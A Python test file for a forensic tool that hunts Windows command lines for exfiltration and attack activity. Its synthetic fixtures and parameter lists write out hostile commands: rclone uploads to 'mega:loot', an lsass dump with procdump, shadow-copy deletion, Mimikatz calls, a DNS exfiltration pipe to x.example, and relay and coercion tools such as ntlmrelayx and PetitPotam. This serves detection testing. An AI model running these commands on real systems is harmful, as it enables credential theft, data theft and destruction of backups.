"""One search of every Windows command line, for every catalog (v0.7.104).

All command lines, accounts and hosts are synthetic."""

import csv
import json
import logging
import re
from pathlib import Path

import pytest

from artifact_engine.config import DATA_DIR
from artifact_engine.core import lol_exfil
from artifact_engine.core.runner import HandlerSkip, ParserContext
from artifact_engine.handlers import _commands as C
from artifact_engine.handlers import _exfil
from artifact_engine.handlers import _indicators as I
from artifact_engine.handlers import win_cmd_hunt as H

_EVTX = ["TimeCreated", "EventId", "UserName", "UserId", "PayloadData1", "ExecutableInfo", "Payload"]
_REG = ["KeyPath", "ValueName", "ValueData", "LastWriteTimestamp"]


def _write(path: Path, header, rows):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(header)
        w.writerows(rows)


def _read(path: Path) -> list[dict]:
    if not path.is_file():
        return []
    with open(path, encoding="utf-8", newline="") as fh:
        return list(csv.DictReader(fh))


def _payload(**data) -> str:
    return json.dumps({"EventData": {"Data": [{"@Name": k, "#text": v} for k, v in data.items()]}})


def _machine(tmp_path: Path) -> Path:
    vol = tmp_path / "C"
    c = vol / "CSVs"
    hist = vol / "Users" / "jdoe" / "AppData" / "Roaming" / "Microsoft" / "Windows" / "PowerShell" \
        / "PSReadLine"
    hist.mkdir(parents=True)
    (hist / "ConsoleHost_history.txt").write_text("Get-Date\nInvoke-Mimikatz\n", encoding="utf-8")
    _write(c / "Persistence" / "tasks_disk.csv", ["task", "runas", "command"],
           [["\\Sync", "SYSTEM", r"C:\ProgramData\rclone.exe copy C:\Shares mega:drop"]])
    _write(c / "Registry" / "reg_services.csv", _REG,
           [["ControlSet001\\Services\\Updater", "ImagePath",
             r"C:\Windows\Temp\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\d.dmp",
             "2026-02-01 09:00:00.1234567"],
            ["ControlSet001\\Services\\Updater", "Description", "vssadmin delete shadows /all", ""]])
    _write(c / "EventLogs" / "evtx_pwsh.csv", _EVTX,
           [["2026-02-02 10:00:00.0000000", "400", "", "",
             "HostApplication=powershell.exe -c vssadmin delete shadows /all /quiet\n", "", ""],
            ["2026-02-02 10:00:00.0000000", "600", "", "",
             "HostApplication=rclone copy C:\\x mega:y", "", ""]])       # not 400/800: not read
    block = "$a = 1\nrclone.exe copy C:\\Finance mega:loot\nWrite-Output $a"
    _write(c / "EventLogs" / "evtx_pwshScrip.csv", _EVTX,
           [["2026-02-05 11:00:00.0000000", "4104", "HOST-01\\jdoe", "", "", "",
             _payload(MessageNumber="1", ScriptBlockText=block)],         # the log is not in order
            ["2026-02-03 11:00:00.0000000", "4104", "HOST-01\\jdoe", "", "", "",
             _payload(MessageNumber="1", ScriptBlockText=block)],
            ["2026-02-03 09:00:00.0000000", "4104", "HOST-01\\jdoe", "", "", "",
             _payload(ScriptBlockText='@{\nGUID="0000"\nCmdletsToExport = @("Clear-EventLog", '
                                      '"Get-Item")\n}')],               # a manifest: declares only
            ["2026-02-04 12:00:00.0000000", "4103", "HOST-01\\jdoe", "", "", "",
             _payload(ContextInfo="Host Application = powershell.exe",
                      Payload='CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest" '
                              'ParameterBinding: name="Uri"; value="https://transfer.sh/x"')]])
    _write(c / "EventLogs" / "evtx_sysmon.csv", _EVTX,
           [["2026-02-06 13:00:00.0000000", "1", "HOST-01\\jdoe", "", "", "SharpHound.exe -c All", ""],
            ["2026-02-06 13:00:00.0000000", "3", "HOST-01\\jdoe", "", "", "SharpHound.exe -c All", ""]])
    res = vol / "Velociraptor" / "LiveResponse" / "results"
    res.mkdir(parents=True)
    (res / "Eiffel.LiveResponse.Windows%2FWindows.System.Pslist.json").write_text(json.dumps(
        {"Pid": 77, "Name": "rclone.exe", "CommandLine": "rclone.exe sync D:\\s mega:b",
         "CreateTime": "2026-02-07T08:00:00Z"}), encoding="utf-8")
    return vol


def _ctx(vol: Path, assets: Path = DATA_DIR / "assets", volume="C") -> ParserContext:
    return ParserContext(evidence=vol, out=vol / "CSVs" / "Detections" / ".work_cmd_hunt",
                         tools=vol, assets=assets, machine_name="HOST-01", volume=volume,
                         log=logging.getLogger("aeng.test"))


def test_every_source_is_read_with_its_account_and_time(tmp_path):
    vol = _machine(tmp_path)
    got = {(s, w, t.splitlines()[0][:30], ts) for s, w, t, ts in C.commands(_ctx(vol), vol / "CSVs")}
    assert ("task", "SYSTEM", r"C:\ProgramData\rclone.exe copy", "") in got
    assert ("service", "Updater", r"C:\Windows\Temp\procdump64.exe", "2026-02-01 09:00:00") in got
    assert ("ps_host", "", "powershell.exe -c vssadmin del", "2026-02-02 10:00:00") in got
    assert ("ps_scriptblock", "HOST-01\\jdoe", "$a = 1", "2026-02-03 11:00:00") in got
    assert ("ps_pipeline", "HOST-01\\jdoe", "CommandInvocation(Invoke-WebRe", "2026-02-04 12:00:00") in got
    assert ("sysmon", "HOST-01\\jdoe", "SharpHound.exe -c All", "2026-02-06 13:00:00") in got
    assert ("process", "pid 77 rclone.exe", "rclone.exe sync D:\\s mega:b", "2026-02-07 08:00:00") in got
    assert ("powershell_history", "jdoe", "Invoke-Mimikatz", "") in got
    sources = [s for s, *_ in C.commands(_ctx(vol), vol / "CSVs")]
    assert sources.count("service") == 1 and sources.count("ps_host") == 1 \
        and sources.count("sysmon") == 1                       # other values / events ignored


def test_a_script_block_is_searched_line_by_line_and_counted(tmp_path):
    vol = _machine(tmp_path)
    H.run(_ctx(vol))
    out = vol / "CSVs" / "Detections" / ".work_cmd_hunt"
    ex = [r for r in _read(out / "exfil_commands.csv") if r["source"] == "ps_scriptblock"]
    assert [(r["command"], r["count"], r["first_seen_utc"], r["last_seen_utc"]) for r in ex] == [
        (r"rclone.exe copy C:\Finance mega:loot", "2", "2026-02-03 11:00:00", "2026-02-05 11:00:00")]
    assert {r["source"] for r in _read(out / "exfil_commands.csv")} >= {"task", "process", "ps_scriptblock"}


def test_suspicious_commands_keep_the_action_categories(tmp_path):
    vol = _machine(tmp_path)
    H.run(_ctx(vol))
    rows = _read(vol / "CSVs" / "Detections" / ".work_cmd_hunt" / "suspicious_commands.csv")
    got = {(r["category"], r["source"]) for r in rows}
    assert ("lsass_dump", "service") in got                    # procdump ... lsass
    assert ("shadow_delete", "ps_host") in got                 # vssadmin delete shadows
    assert ("ad_recon", "sysmon") in got
    assert ("credential_theft", "powershell_history") in got
    assert not any(r["source"] == "service" and "vssadmin" in r["command"] for r in rows)
    assert "log_clearing" not in {r["category"] for r in rows}


def test_a_vss_volume_never_reads_the_live_processes(tmp_path):
    vol = _machine(tmp_path)
    assert "process" not in {s for s, *_ in C.commands(_ctx(vol, volume="VSS1"), vol / "CSVs")}


def test_a_pattern_whose_literal_is_absent_is_never_run():
    calls = []

    class Spy:
        def search(self, text):
            calls.append(text)
            return re.search("copy", text)

    pats = [({"tool": "t", "detect_type": "exfil_action", "literal": "mega:"}, Spy())]
    rows = _exfil.scan([("s", "w", "robocopy C:\\a D:\\b"), ("s", "w", "rclone copy x mega:y")], pats)
    assert calls == ["rclone copy x mega:y"] and len(rows) == 1


def test_regexes_stay_linear_on_a_long_line():
    """Measured before v0.7.104: 9.6 s for 855 patterns on one 500-character line."""
    import time
    pats = _exfil.load(DATA_DIR / "assets")
    line = " ".join(["curl", "-F", "tar", "copy", "x" * 7, "|", "nc"] * 120)[:2000]
    t = time.perf_counter()
    _exfil.scan([("s", "w", line)], pats)
    assert time.perf_counter() - t < 10.0       # was minutes; slack for a loaded host


def test_the_generator_keeps_a_literal_and_no_leading_wildcard():
    assert lol_exfil.literal("rclone copy * sftp:*|s3:*|mega:*") == "rclone"
    assert lol_exfil.literal("Duplicati.Server.exe|Duplicati.GUI.TrayIcon.exe") == ""
    for p in ("rclone copy * mega:*", "curl * paste.rs|ix.io", "*tar * | nc *"):
        rx = lol_exfil.to_regex(p)
        assert ".*?[" not in rx and not rx.endswith(".*"), rx
    pipe = re.compile(lol_exfil.to_regex("*xxd -p * | fold -w * | *"), re.IGNORECASE)
    assert pipe.search("xxd -p f | fold -w 60 | while read l; do dig $l.x.example; done")


def test_it_skips_without_a_catalog(tmp_path):
    with pytest.raises(HandlerSkip):
        H.run(_ctx(_machine(tmp_path), assets=tmp_path / "none"))


@pytest.mark.parametrize("command, label", [
    ("python3 getST.py -spn cifs/HOST-01.example.local example.local/jdoe", "kerberos_abuse"),
    ("impacket-getTGT example.local/jdoe -hashes :0011", "lateral_tooling"),
    ("python3 ntlmrelayx.py -t ldaps://10.0.0.5 --delegate-access", "auth_coercion"),
    ("python3 PetitPotam.py 10.0.0.6 10.0.0.5", "auth_coercion"),
    ("sudo responder -I eth0", "auth_coercion"),
    ("nxc smb 10.0.0.5 -u jdoe -p ''", "lateral_tooling"),
    (r"C:\Tools\Certify.exe find /vulnerable", "ad_recon"),
    (r".\Seatbelt.exe -group=all", "ad_recon"),
    (r"Snaffler.exe -s -o out.log", "ad_recon"),
    ("python3 lookupsid.py example.local/jdoe@10.0.0.5", "ad_recon"),
    (r"SafetyKatz.exe", "credential_theft"),
    ('mimi.exe "privilege::debug" "lsadump::sam"', "credential_theft"),
])
def test_the_ad_attack_tools_are_named(command, label):
    rules = I.load_indicators(DATA_DIR / "assets" / "suspicious_tools.txt")
    assert label in I.match_labels(rules, command), command


@pytest.mark.parametrize("command", [
    "Write-Host 'responder al cliente antes del viernes'",    # the word, not the tool
    "certutil -verifystore Root",
    "Get-ADUser -Filter * -Properties LastLogonDate",
    r"C:\Windows\System32\services.exe",
    "python3 manage.py getst",
    "nxc --version",
])
def test_their_everyday_namesakes_are_not(command):
    rules = I.load_indicators(DATA_DIR / "assets" / "suspicious_tools.txt")
    assert not I.match_labels(rules, command), command
